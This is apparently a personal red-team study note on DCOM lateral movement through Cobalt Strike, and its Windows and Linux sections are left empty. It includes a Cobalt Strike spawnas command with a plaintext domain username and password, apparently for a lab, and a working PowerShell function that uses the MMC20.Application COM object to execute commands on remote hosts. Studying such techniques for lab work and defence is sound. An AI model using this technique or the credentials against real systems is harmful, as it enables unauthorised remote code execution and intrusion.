### Technical Overview
COM (Component Object Model) objects are objects that are "exposed" on the operating system, much like an API.

These Objects allow other software to interact with itself and can be found in excess on any modern Windows operating system.
- They still have their uses, but the well documented COM objects that can be used for lateral movement are pretty easily spotted nowadays, of course your mileage can vary from environment to environment.
###### OPSEC
DCOM lateral movement has been one of the better lateral movement techniques for years, however as they became more popular and were starting to get more attention by bloggers and open source tooling, detection rates skyrocketed.
# C2 - Cobalt Strike
## Enumeration 
DCOM lateral movement is not built into Cobalt Strike. Furthermore, DCOM does not like token impersonation. As a result you will need a C2 channel as the user you wish to laterally move with.

Please spawn a new Beacon using the following command (if your listener is called something other than HTTPS-SHORT, please replace with the name of your listener (can be tab completed)) 

```markdown
spawnas draconem\Giulio.Stanion d8PEZ#$UM6Vs!h5j HTTPS
```
![[Pasted image 20240412013329.png]]
 A new beacon is going to be spawned as Giulio, please switch over to this beacon for the next commands of this lateral movement technique. 
## Exploitation 

In order to lateraly move over DCOM, the easiest way would be to use PowerShell, we have the following Script available 
```powershell
function Invoke-MMC20
{
[CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Target,
        [Parameter(Mandatory=$True)]
        [string] $Command
    )
    echo "executing $Command on $Target"
    $a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",$Target))
    $a.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,$Command,"")

}
```

---
# Windows
## Overview 

```markdown
```
## Enumeration 

```markdown
```
## Exploitation 

```markdown
```

----
# Linux
## Overview 

```markdown
```
## Enumeration 

```markdown
```
## Exploitation 

```markdown
```
